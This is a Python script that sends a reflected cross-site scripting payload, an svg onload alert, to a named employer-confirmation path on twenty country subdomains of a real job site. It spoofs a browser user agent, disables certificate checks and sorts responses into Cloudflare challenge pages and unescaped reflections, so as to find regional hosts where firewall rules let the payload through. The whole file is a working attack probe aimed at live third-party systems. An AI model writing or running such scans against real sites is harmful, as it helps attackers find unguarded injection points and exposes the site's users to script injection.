import re

import requests
import urllib3

urllib3.disable_warnings()
UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                    "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
      "Accept-Language": "en-US,en;q=0.9"}
CANARY = "40931"
TOK = "zqloc4093"
PAY = f'"><svg/onload=alert({CANARY})>'

# same disclosed-vulnerable path across country hosts: CF rules can differ per zone
COUNTRIES = ["www", "uk", "ca", "au", "ie", "nz", "in", "sg", "de", "fr",
             "nl", "it", "es", "jp", "br", "mx", "ch", "at", "be", "se"]
PATHS = ["/hire/employer-confirmation"]
PARAMS = ["co", "hl"]

rows = []
for c in COUNTRIES:
    for path in PATHS:
        for p in PARAMS:
            u = f"https://{c}.indeed.com{path}?{p}=" + requests.utils.quote(PAY, safe="")
            try:
                r = requests.get(u, timeout=15, verify=False, headers=UA,
                                 allow_redirects=False)
            except Exception as e:
                rows.append({"host": c, "p": p, "err": type(e).__name__})
                continue
            body = r.text or ""
            chal = bool(re.search(r"cType:\s*'managed'|Just a moment|__cf_chl", body, re.I))
            rows.append({"host": f"{c}.indeed.com", "param": p,
                         "status": r.status_code, "len": len(body),
                         "challenge": chal,
                         "raw": f"<svg/onload=alert({CANARY})" in body,
                         "tok": TOK in body})
            flag = "RAW!!" if rows[-1]["raw"] else ("chal" if chal else str(r.status_code))
            print(f"  {c:5}.indeed.com {p:3} {r.status_code} len={len(body):7} {flag}")

import json
json.dump(rows, open("/opt/watch/logs/indeed/locale_matrix.json", "w"), indent=1)
ok = [x for x in rows if x.get("status") == 200 and not x.get("challenge")]
print(f"\nnon-challenge 200s: {len(ok)}")
for x in ok:
    print("   ", x)
